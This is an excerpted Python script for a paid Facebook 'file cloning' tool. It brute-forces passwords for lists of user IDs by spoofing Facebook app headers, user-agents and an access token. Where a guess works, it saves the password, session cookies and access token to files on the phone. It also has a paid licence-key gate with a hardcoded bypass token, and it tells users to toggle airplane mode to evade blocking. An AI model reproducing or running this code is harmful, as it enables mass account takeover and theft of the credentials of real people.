...
def buy():
	...
	logo()
	line()
	os.system('xdg-open https://iqcpromodapk.com/watched-mod-apk-download-page/')
	...
	print(" [•] 350 / 1Month , 300 / 15 Days ")
	print(" [•] Payment : JazzCash/Easypaisa")
	print(' [•] Account Num : 03152056613 ')
	print(" [•] Token :\033[1;95m %s"%(aqib_token))
...
def check_again():
	...
	if 'free' in str(server_keys):
		...
		if str(aqib_token)+'|expired' in server_keys:
			buy()
	elif str(aqib_token) == '1028390A2831028365146151BEFEUT1412SMP':
		iAmMain().iAmMenu()
	elif str(aqib_token) in server_keys:
		if str(aqib_token)+'|fuck' in server_keys:
			status = 'fuck'
...
def iAmMethod1Ua():
	...
	#a = "Mozilla/5.0 Linux; Android 9.0; SM-S10+ Build/LMY47I AppleWebKit/537.36 KHTML, like Gecko Version/4.0 Chrome/39.0.0.0 Mobile Safari/537.36"
	ua = random.choice(["Mozilla/5.0 (X11; Linux x86_64; Linux Mint 17.2 Rafaela) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.0 Maxthon/1.0.5.3 Safari/537.36","Mozilla/5.0 (X11; Linux i686; Linux Mint 17.2 Rafaela) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.0 Maxthon/1.0.5.3 Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; ASUS_Z016D Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 MxBrowser/4.5.10.7000","Mozilla/5.0 (iPad; CPU OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/10.0 Mobile/15E216 Safari/602.1 MXiOS/5.2.8.415","Mozilla/5.0 (iPad; CPU OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/10.0 Mobile/15E216 Safari/602.1 MXiOS/5.2.8.415","Mozilla/5.0 (iPhone; CPU iPhone OS 12_4_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1 MXiOS/5.4.4.1","Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/64.0.3282.137 Mobile Safari/537.36 MxBrowser/4.5.10.1300","Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.75 Safari/537.36 Maxthon/5.1.4.2400","Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.79 Safari/537.36 Maxthon/5.2.5.3000","Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.79 Safari/537.36 Maxthon/5.2.5.4000","Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.79 Safari/537.36 Maxthon/5.2.7.2000","Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.79 Safari/537.36 Maxthon/5.2.7.2500","Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.79 Safari/537.36 Maxthon/5.2.7.5000","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_16) AppleWebKit/613.3.9 (KHTML, like Gecko) Version/15.6.1 Safari/613.3.9 Maxthon/5.1.60","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/605.3.8 (KHTML, like Gecko) Version/11.1.2 Safari/605.3.8 Maxthon/5.1.60","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/610.1.28 (KHTML, like Gecko) Version/14.0 Safari/610.1.28 Maxthon/5.1.60","Mozilla/5.0 (Linux; Android 5.1; m3 note Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/51.0.2704.108 Mobile Safari/537.36 Maxthon/3251","Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5 Plus Build/OPM1.171019.019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 Maxthon/3490","Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1 MXiOS/6.0.4.144","Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Mobile/15E148 Safari/604.1 MXiOS/6.0.6.160","Mozilla/5.0 (compatible; Windows NT 6.1; U; WOW64; IA64; YB/3.5.3;) AppleWebKit/599.0+ (KHTML, like Gecko) Maxthon/5.0 Chrome/99.3.3112.78 Safari/637.36 OPR/89.0.2597.57 QupZilla/2.1.2","Mozilla/5.0 (Linux; Android 8.0.0; ANE-LX1 Build/HUAWEIANE-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.91 Mobile Safari/537.36 Maxthon/3241","Mozilla/5.0 (Linux; Android 8.0.0; ANE-LX1 Build/HUAWEIANE-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.91 Mobile Safari/537.36 Maxthon/3241","Mozilla/5.0 (compatible; Windows NT 6.1; U; WOW64; IA64; en) AppleWebKit/599.0+ (KHTML, like Gecko) Maxthon/5.3.8.2100 Chrome/81.0.4044.92 Safari/537.36 OPR/67.0.3575.137 QupZilla/2.2.60","Mozilla/5.0 (compatible; Windows NT 6.1; U; WOW64; IA64; en) AppleWebKit/599.0+ (KHTML, like Gecko) Maxthon/5.3.8.2100 Chrome/81.0.4044.92 Safari/537.36 OPR/67.0.3575.137 QupZilla/2.2.60","Mozilla/5.0 (Linux; Android 7.1.2; Redmi Note 5A Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.210 Mobile Safari/537.36 Maxthon/3487","Mozilla/5.0 (Linux; Android 7.1.2; Redmi Note 5A Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.210 Mobile Safari/537.36 Maxthon/3487","Mozilla/5.0 (Linux; Android 10; ELS-NX9 Build/HUAWEIELS-N29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36 MxBrowser/4.3.5.2000","Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.79 Safari/537.36 Maxthon/5.2.5.2000","Mozilla/5.0 (Linux; Android 12; SM-S901E Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36 Maxthon/9000",])
	return ua
...
def iAmMethod2Ua():
	...
	END = "[FBAN/FB4A;FBAV/+fbap+;FBBV/+fbbv+;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/+str(random.randint(000000000,999999999))+;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/+model+;FBSV/+android_version+;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
...
class iAmMain:
	...
	def iAmMenu(self):
		...
		line()
		p(" [1] File Cloning ")
		p(" [2] Seperate Links from File  ")
		p(" [3] Cut Used Files Lines  ")
		p(" [E] Exit Tool ")
		line()
	...
	def file_menu(self):
		...
		file = input(" [•] \033[91;1mPut File Path : ")
		try:
	...
	def password_menu(self,id):
		...
		try:
			...
			if plimit =="":
				...
				p(" [•] Password Limit Should under 30 ");sp(2);self.password_menu()
		except:
			plimit = 4
		logo()
		...
		p(" [•] Use Flight (Airplane) Mode Before Cloning ")
		line()
	...
	def method1(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [HASHIM] %s | M1 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				...
				if "session_key" in q:
					...
					p('\r\033[1;92m[Amna-OK] %s | %s \033[1;97m '%(uid,pw))
					open('/sdcard/COOKIE_TOKEN.txt','a').write(cok+'|'+token+'\n')
					ok.append(uid)
					open('/sdcard/HASHIM_M1_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/HASHIM_M1_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					#p('\r\033[1;91m[AQIB-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/HASHIM_M1_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
	...
	def method2(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [HASHIM] %s | M2 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
...
'access_token' : '350685531728|62f8ce9f74b12f84c123cc23437a4a32' }
				...
				if "session_key" in q:
					...
					token = q["access_token"]
					open('/sdcard/COOKIE_TOKEN.txt','a').write(cok+'|'+token+'\n')
					p('\r\033[1;92m[HASHIM-OK] %s | %s \033[1;97m '%(uid,pw))
					#(f" [•]\033[1;96m Cookie : {cok}\033[1;97m")
					ok.append(uid)
					open('/sdcard/HASHIM_M2_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/HASHIM_M2_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					#p('\r\033[1;91m[AQIB-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/Amna_M2_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
	...
	def method3(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [Amna] %s | M3 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
...
'x-fb-connection-token': connection_token()}
				...
				if "session_key" in q:
					...
					p('\r\033[1;92m[HASHIM-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/HASHIM_M3_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/HASHIM_M3_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					#p('\r\033[1;91m[AQIB-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/HASHIM_M3_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				...
				if "session_key" in q:
					token = q["access_token"]
					cok = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
					p('\r\033[1;92m[HASHOM-OK] %s | %s \033[1;97m '%(uid,pw))
					open('/sdcard/COOKIE_TOKEN.txt','a').write(cok+'|'+token+'\n')
					ok.append(uid)
					open('/sdcard/HASHIM_M4_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/HASHIM_M4_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					#p('\r\033[1;91m[AQIB-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
